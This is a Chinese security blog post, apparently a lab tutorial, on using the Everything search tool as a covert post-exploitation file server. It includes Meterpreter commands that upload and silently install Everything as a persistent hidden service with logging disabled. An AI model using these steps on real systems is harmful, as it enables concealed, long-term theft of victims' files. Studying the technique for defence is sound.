**本文仅限技术研究与讨论，仅用于信息防御技术，严禁用于非法用途，否则产生的一切后果自行承担！**

前段时间在论坛里看到有人讨论Everything不正确配置导致数据泄露风险，然后就想着就写一篇技术搞吧。

# **0x01 前言**

Everything搜索文件资料之神速，有使用过的朋友们都深有体会，相对于Windows自带的搜索功能，使用Everything，可以让我们享受使用搜索引擎一般地在本地硬盘上搜索我们的文件信息。
**除非用户对外网公开并且开启了HTTP或FTP服务并且没有设置密码才可能导致数据泄露，这么多“并且”还是挺难满足的，所以风险其实也没那么大！**

**But** Everything在安全攻防中的应用早已有之，如下图，就是某种病毒释放Everything为其所用，甚至有些勒索病毒也会用到 **。**
**病毒运行后会从资源节解出Everything.exe和Everything.ini**
，之后加载执Everything，用于查找浏览器主程序的文件路径，从配置文件中获取任意一个插件的URL地址，下载插件并调用找到的浏览器程序，安装插件，之后向安装扩展程序的窗体发送确认消息完成插件安装，相关代码如下:

![Snipaste_2020-03-08_10-10-18.png](https://image.3001.net/images/20200308/F23583633446_5e6454268e337.png!small)

尤其是在后渗透测试阶段，你的目的是长期获取目标上的文件，那么Everything就是一个神器，它的好处在于：

> 1>免杀，这是毋庸置疑的
>
> 2>功能完备，既有强大的搜索功能，还能开HTTP服务和FTP服务
>
> 3>体积小，便于部署，有些目标上甚至自带Everything

下面我就抛转引玉了。

# **0x02 部署Everything Client Server**

**到了后渗透阶段，隐蔽是最重要的，正所谓"善守者盾于九地之下”**
。其实，Everything已经很贴心的为我们提供了丰富的命令行功能，你可以参考官网或自带帮助。

![Snipaste_2020-03-08_10-21-57.png](https://image.3001.net/images/20200308/1583634144_5e6456e0b1e74.png!small)

![Snipaste_2020-03-08_10-23-08.png](https://image.3001.net/images/20200308/1583634224_5e64573023bc1.png!small)

我们要用的是他的“客户服务”这个功能，它会以服务的形式运行，因此目标不会产生界面，完全无感，并且重启有效！

![Snipaste_2020-03-08_10-25-44.png](https://image.3001.net/images/20200308/1583634440_5e645808caf7b.png!small)

获取文件最需要的是开启HTTP和FTP这两个功能。

首先，Everything运行需要exe和ini两个文件，所有的选项都是基于ini配置文件，首次运行exe文件会在同目录下自动生成该ini文件，可以选择只上传exe文件，运行后再修改ini文件，但考虑到ini文件修改后需重启exe才会生效，因此我们选择在本地配置好ini文件，上传exe和ini两个文件。

本地配置ini文件直接在GUI界面的“工具”，“选项”中进行，勾选启用HTTP服务和FTP服务，都不要选择保存日志，选择“允许文件下载”，端口尽量不选80和21，避免冲突，建议设置密码，设置好后，在本地浏览器中测试，如下所示：

![Snipaste_2020-03-08_10-33-36.png](https://image.3001.net/images/20200308/1583634840_5e64599837136.png!small)

![Snipaste_2020-03-08_10-35-39.png](https://image.3001.net/images/20200308/1583634967_5e645a171678e.png!small)

#### 设置好后，将两个文件放在一个空目录中，通过已获得权限上传exe文件和ini文件，我用Meterpreter演示，攻

#### 击机kali(192.168.1.130)，目标机XP(192.168.1.129)。

![Snipaste_2020-03-08_10-37-47.png](https://image.3001.net/images/20200308/1583635125_5e645ab531e45.png!small)

![Snipaste_2020-03-08_10-39-22.png](https://image.3001.net/images/20200308/1583635175_5e645ae770e2e.png!small)

Meterpreter中执行upload –r path进行递归上传（把文件夹中的文件全部上传）

![Snipaste_2020-03-08_10-40-50.png](https://image.3001.net/images/20200308/1583635262_5e645b3eb24d4.png!small)

回显成功，ls查看是否上传成功

#### Install and open client-service

#### 执行以下两条命令:

    
    
    execute -f 'C:\windows\temp\es.exe' -a -install-client-service –H
    
    execute -f 'C:\windows\temp\es.exe' -a -start-client-service –H

![Snipaste_2020-03-08_10-46-19.png](https://image.3001.net/images/20200308/1583635591_5e645c8732614.png!small)

#### 没有错误提示后，执行netstat –ano查看端口是否开启，我这里在目标XP中查看服务，也已正常启动。

![Snipaste_2020-03-08_10-49-29.png](https://image.3001.net/images/20200308/1583635778_5e645d42920a7.png!small)

#### 在浏览器中访问，输入用户名密码，可以正常访问。

![Snipaste_2020-03-08_10-50-27.png](https://image.3001.net/images/20200308/1583635838_5e645d7e657ba.png!small)

#### 可以把上传、执行命令写入up-es.rc文件，方便下次执行

    
    
    upload -r /root/Downloads/ C:\windows\temp
    
    execute -f 'C:\windows\temp\es.exe' -a -install-client-service –H
    
    execute -f 'C:\windows\temp\es.exe' -a -start-client-service –H

# **0x03 注意  
**

> 1>内网机器需要将端口转发出来才可以访问
>
> 2>Metepreter中路径需要加双斜杠
>
> 3> 这里需要注意exe文件可以改名，但ini文件必须用“Everything.ini

